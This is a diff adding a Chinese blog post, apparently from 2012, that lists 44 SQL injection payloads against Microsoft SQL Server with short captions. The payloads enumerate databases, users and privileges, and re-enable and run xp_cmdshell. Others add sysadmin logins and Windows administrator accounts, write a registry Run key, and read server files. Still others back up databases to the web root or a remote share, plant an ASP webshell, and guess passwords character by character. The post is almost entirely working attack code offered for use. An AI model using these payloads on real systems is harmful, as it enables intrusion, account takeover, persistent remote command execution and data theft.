@@ -1,0 +1,150 @@
+---
+layout: post
+status: publish
+published: true
+title: SQL注入语句大全（金典收藏）
+author: Byronlee
+author_login: ginchenorlee
+author_email: ginchenorlee@sina.com
+excerpt: ! "1、返回的是连接的数据库名\r\n<pre class=\"brush: actionscript3; gutter: true\">and
+  db_name()&gt;0</pre>\r\n2、作用是获取连接用户名\r\n<pre class=\"brush: actionscript3; gutter:
+  true\">and user&gt;0</pre>\r\n3、将数据库备份到Web目录下面\r\n<pre class=\"brush: actionscript3;
+  gutter: true\">;backup database 数据库名 to disk=&#039;c:\\inetpub\\wwwroot\\1.db&#039;;--</pre>\r\n4、显示SQL系统版本\r\n<pre
+  class=\"brush: actionscript3; gutter: true\">and 1=(select @@VERSION) 或and 1=convert(int,@@version)--</pre>\r\n5、判断xp_cmdshell扩展存储过程是否存在\r\n<pre
+  class=\"brush: actionscript3; gutter: true\">and 1=(SELECT count(*) FROM master.dbo.sysobjects
+  WHERE xtype = &#039;X&#039; AND name =&#039;xp_cmdshell&#039;)</pre>\r\n6、恢复xp_cmdshell扩展存储的命令\r\n<pre
+  class=\"brush: actionscript3; gutter: true\">;exec master.dbo.sp_addextendedproc
+  &#039;xp_cmdshell&#039;,&#039;e:\\inetput\\web\\xplog70.dll&#039;;--</pre>\r\n"
+wordpress_id: 42
+wordpress_url: http://www.ginchenorlee.com/?p=42
+date: !binary |-
+  MjAxMi0wNi0wNCAxMjowOToxNCArMDAwMA==
+date_gmt: !binary |-
+  MjAxMi0wNi0wNCAxMjowOToxNCArMDAwMA==
+categories:
+- 信息安全
+- SQL注入
+tags: []
+comments: []
+---
+<p>1、返回的是连接的数据库名</p>
+<pre class="brush: actionscript3; gutter: true">and db_name()&gt;0</pre>
+<p>2、作用是获取连接用户名</p>
+<pre class="brush: actionscript3; gutter: true">and user&gt;0</pre>
+<p>3、将数据库备份到Web目录下面</p>
+<pre class="brush: actionscript3; gutter: true">;backup database 数据库名 to disk=&#039;c:\inetpub\wwwroot.db&#039;;--</pre>
+<p>4、显示SQL系统版本</p>
+<pre class="brush: actionscript3; gutter: true">and 1=(select @@VERSION) 或and 1=convert(int,@@version)--</pre>
+<p>5、判断xp_cmdshell扩展存储过程是否存在</p>
+<pre class="brush: actionscript3; gutter: true">and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE xtype = &#039;X&#039; AND name =&#039;xp_cmdshell&#039;)</pre>
+<p>6、恢复xp_cmdshell扩展存储的命令</p>
+<pre class="brush: actionscript3; gutter: true">;exec master.dbo.sp_addextendedproc &#039;xp_cmdshell&#039;,&#039;e:\inetput\web\xplog70.dll&#039;;--</pre>
+<p><a id="more"></a><a id="more-42"></a></p>
+<p>7、向启动组中写入命令行和执行程序</p>
+<pre class="brush: actionscript3; gutter: true">;EXEC master.dbo.xp_regwrite &#039;HKEY_LOCAL_MACHINE&#039;,&#039;SOFTWARE\Microsoft\Windows\CurrentVersion\
+Run&#039;,&#039;help1&#039;,&#039;REG_SZ&#039;,&#039;cmd.exe /c net user test ptlove /add&#039;</pre>
+<p>8、查看当前的数据库名称</p>
+<pre class="brush: actionscript3; gutter: true">and 0 &lt;&gt; db_name(n) n改成0,1,2,3……就可以跨库了 或and 1=convert(int,db_name())--</pre>
+<p>9、不需xp_cmdshell支持在有注入漏洞的SQL服务器上运行CMD命令（同第76）<br />
+10、则把得到的数据内容全部备份到WEB目录下</p>
+<pre class="brush: actionscript3; gutter: true">;backup database 数据库名 to disk=&#039;c:\inetpub\wwwroot\save.db&#039;</pre>
+<p>11、通过复制CMD创建UNICODE漏洞</p>
+<pre class="brush: actionscript3; gutter: true">;exec master.dbo.xp_cmdshell &quot;copy c:\winnt\system32\cmd.exe c:\inetpub\scripts\cmd.exe&quot;</pre>
+<p>12、遍历系统的目录结构，分析结果并发现WEB虚拟目录<br />
+先创建一个临时表：</p>
+<pre class="brush: actionscript3; gutter: true">temp ;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));--</pre>
+<p>(1)利用xp_availablemedia来获得当前所有驱动器,并存入temp表中</p>
+<pre class="brush: actionscript3; gutter: true">;insert temp exec master.dbo.xp_availablemedia;--</pre>
+<p>通过查询temp的内容来获得驱动器列表及相关信息<br />
+(2)利用xp_subdirs获得子目录列表,并存入temp表中</p>
+<pre class="brush: actionscript3; gutter: true">;insert into temp(id) exec master.dbo.xp_subdirs &#039;c:<pre wp-pre-tag-12></pre>#039;;--</pre>
+<p>(3)还可以利用xp_dirtree获得所有子目录的目录树结构,并寸入temp表中</p>
+<pre class="brush: actionscript3; gutter: true"> ;insert into temp(id,num1) exec master.dbo.xp_dirtree &#039;c:<pre wp-pre-tag-13></pre>#039;;-- （实验成功）</pre>
+<p>13、查看某个文件的内容，可以通过执行xp_cmdsell</p>
+<pre class="brush: actionscript3; gutter: true">;insert into temp(id) exec master.dbo.xp_cmdshell &#039;type c:\web\index.asp&#039;;--</pre>
+<p>14、将一个文本文件插入到一个临时表中</p>
+<pre class="brush: actionscript3; gutter: true">;bulk insert temp(id) from &#039;c:\inetpub\wwwroot\index.asp&#039;</pre>
+<p>15、每完成一项浏览后，应删除TEMP中的所有内容，删除方法是：</p>
+<pre class="brush: actionscript3; gutter: true">;delete from temp;--</pre>
+<p>16、浏览TEMP表的方法是：</p>
+<pre class="brush: actionscript3; gutter: true">and (select top 1 id from TestDB.dbo.temp)&gt;0 假设TestDB是当前连接的数据库名</pre>
+<p>17、猜解所有数据库名称</p>
+<pre class="brush: actionscript3; gutter: true">and (select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid=6) &lt;&gt;0 dbid=6,7,8分别得到其它库名</pre>
+<p>18、猜解数据库中用户名表的名称</p>
+<pre class="brush: actionscript3; gutter: true">and (select count(*) from TestDB.dbo.表名)&gt;0 若表名存在，则abc.asp工作正常，否则异常。如此循环，直到猜到系统帐号表的名称。</pre>
+<p>19、判断是否是sysadmin权限</p>
+<pre class="brush: actionscript3; gutter: true">and 1=(SELECT IS_SRVROLEMEMBER(&#039;sysadmin&#039;))</pre>
+<p>20、判断是否是SA用户</p>
+<pre class="brush: actionscript3; gutter: true">&#039;sa&#039;=(SELECT System_user)</pre>
+<p>21、查看数据库角色</p>
+<pre class="brush: actionscript3; gutter: true">;use model--</pre>
+<p>22、查看库名</p>
+<pre class="brush: actionscript3; gutter: true">and 0&lt;&gt;(select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid=6)--</pre>
+<p>23、获得第一个用户建立表的名称</p>
+<pre class="brush: actionscript3; gutter: true">and (select top 1 name from TestDB.dbo.sysobjects where xtype=&#039;U&#039; and status&gt;0 )&gt;0 假设要获得数据库是TestDB.dbo</pre>
+<p>24、获得第二个用户建立的表的名称</p>
+<pre class="brush: actionscript3; gutter: true">and (select top 1 name from TestDB.dbo.sysobjects where xtype=&#039;U&#039; and status&gt;0 and name not in(&#039;xyz&#039;))&gt;0</pre>
+<p>25、获得第三个用户建立的表的名称</p>
+<pre class="brush: actionscript3; gutter: true">and (select top 1 name from TestDB.dbo.sysobjects where xtype=&#039;U&#039; and status&gt;0 and name not in(&#039;xyz&#039;,&#039;&#039;))&gt;0 &#039;&#039;中为第二个用户名</pre>
+<p>26、获得第四个用户建立的表的名称</p>
+<pre class="brush: actionscript3; gutter: true">and (select top 1 name from TestDB.dbo.sysobjects where xtype=&#039;U&#039; and status&gt;0 and name not in(&#039;xyz&#039;,&#039;&#039;,&#039;&#039;))&gt;0 &#039;&#039;,&#039;&#039;中为第二,三个用户名</pre>
+<p>27、获得表中记录的条数</p>
+<pre class="brush: actionscript3; gutter: true">and (select count(*) from 表名）&lt;5 记录条数小于5 或 &lt;10 记录条数小于10 ……等等</pre>
+<p>28、测试权限结构（mssql）</p>
+<pre class="brush: actionscript3; gutter: true">and 1=(SELECT IS_SRVROLEMEMBER(&#039;sysadmin&#039;));--
+and 1=(SELECT IS_SRVROLEMEMBER(&#039;serveradmin&#039;));--
+and 1=(SELECT IS_SRVROLEMEMBER(&#039;setupadmin&#039;));--
+and 1=(SELECT IS_SRVROLEMEMBER(&#039;securityadmin&#039;));--
+and 1=(SELECT IS_SRVROLEMEMBER(&#039;diskadmin&#039;));--
+and 1=(SELECT IS_SRVROLEMEMBER(&#039;bulkadmin&#039;));--
+and 1=(SELECT IS_MEMBER(&#039;db_owner&#039;));--</pre>
+<p>29、 添加mssql和系统的帐户</p>
+<pre class="brush: actionscript3; gutter: true">;exec master.dbo.sp_addlogin username;--
+;exec master.dbo.sp_password null,username,password;--
+;exec master.dbo.sp_addsrvrolemember sysadmin username;--
+;exec master.dbo.xp_cmdshell &#039;net user username password /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /add&#039;;--
+;exec master.dbo.xp_cmdshell &#039;net user username password /add&#039;;--
+;exec master.dbo.xp_cmdshell &#039;net localgroup administrators username /add&#039;;--</pre>
+<p>30、 简洁的webshell</p>
+<pre class="brush: actionscript3; gutter: true">use model
+create table cmd(str image);
+insert into cmd(str) values (&#039;&lt;%=server.createobject(&quot;wscript.shell&quot;).exec(&quot;cmd.exe /c &quot;&amp;request(&quot;c&quot;)).stdout.readall%&gt;&#039;);
+backup database model to disk=&#039;g:\wwwtest\l.asp&#039;;</pre>
+<p>请求的时候，像这样子用：</p>
+<pre class="brush: actionscript3; gutter: true">http://ip/l.aspc=dir</pre>
+<p>31、猜解字段名称<br />
+猜解法：and (select count(字段名) from 表名)&gt;0 若“字段名”存在，则返回正常<br />
+读取法：and (select top 1 col_name(object_id('表名'),1) from sysobjects)&gt;0 把col_name(object_id('表名'),1)中的1依次换成2,3,4,5，6…就可得到所有的字段名称。<br />
+32、 猜解用户名与密码<br />
+ASCII码逐字解码法:基本的思路是先猜出字段的长度，然后依次猜出每一位的值<br />
+and (select top 1 len(username) from admin)=X(X=1,2，3,4，5，… n，假设：username为用户名字段的名称，admin为表的名称 若x为某一值i且abc.asp运行正常时，则i就是第一个用户名的长度。<br />
+and (select top 1 ascii(substring(username,m,1)) from admin)=n (m的值在上一步得到的用户名长度之间，当m=1，2,3，…时猜测分别猜测第1,2,3,…位的值；n的值是1~9、a~z、A~Z的ASCII值，也就是1~128之间的任意值；admin为系统用户帐号表的名称)，</p>
+<p>33、建立数据表</p>
+<pre class="brush: actionscript3; gutter: true">;create table 表名 (列名1 数据类型,列名2 数据类型);--</pre>
+<p>34、向表格中插入数据</p>
+<pre class="brush: actionscript3; gutter: true">;insert into 表名 (列名1,列名2，……） values (&#039;值1&#039;,&#039;值2&#039;……);--</pre>
+<p>35、更新记录</p>
+<pre class="brush: actionscript3; gutter: true">update 表名 set 列名1=&#039;值&#039;…… where ……</pre>
+<p>36、删除记录</p>
+<pre class="brush: actionscript3; gutter: true">delete from 表名 where ……</pre>
+<p>37、删除数据库表格</p>
+<pre class="brush: actionscript3; gutter: true">drop table 表名</pre>
+<p>38、将文本文件导入表<br />
+使用'bulk insert'语法可以将一个文本文件插入到一个临时表中。简单地创建这个表：</p>
+<pre class="brush: actionscript3; gutter: true">create table foo( line varchar(8000))</pre>
+<p>然后执行bulk insert操作把文件中的数据插入到表中，如：</p>
+<pre class="brush: actionscript3; gutter: true">bulk insert foo from &#039;c:\inetpub\wwwroot\process_login.asp&#039;</pre>
+<p>39、备份当前数据库的命令：</p>
+<pre class="brush: actionscript3; gutter: true">declare @a sysname;set @a=db_name();backup database @a to disk=&#039;你的IP你的共享目录bak.dat&#039; ,name=&#039;test&#039;;--</pre>
+<p>40、使用sp_makewebtask处理过程的相关请求写入URL</p>
+<pre class="brush: actionscript3; gutter: true">; EXEC master..sp_makewebtask &quot;\10.10.1.3\share\output.html&quot;, &quot;SELECT * FROM INFORMATION_SCHEMA.TABLES&quot;</pre>
+<p>41、将获得SQLSERVER进程的当前工作目录中的目录列表</p>
+<pre class="brush: actionscript3; gutter: true">Exec master..xp_cmdshell &#039;dir&#039;</pre>
+<p>42、将提供服务器上所有用户的列表</p>
+<pre class="brush: actionscript3; gutter: true">Exec master..xp_cmdshell &#039;net user&#039;</pre>
+<p>43、读注册表存储过程</p>
+<pre class="brush: actionscript3; gutter: true">exec xp_regread HKEY_LOCAL_MACHINE,&#039;SYSTEM\CurrentControlSet\Services\lanmanserver\parameters&#039;, &#039;nullsessionshares&#039;</pre>
+<p>44、xp_servicecontrol过程允许用户启动，停止，暂停和继续服务</p>
+<pre class="brush: actionscript3; gutter: true">exec master..xp_servicecontrol &#039;start&#039;,&#039;schedule&#039;
+exec master..xp_servicecontrol &#039;start&#039;,&#039;server&#039;</pre>
+<p>&nbsp;</p>
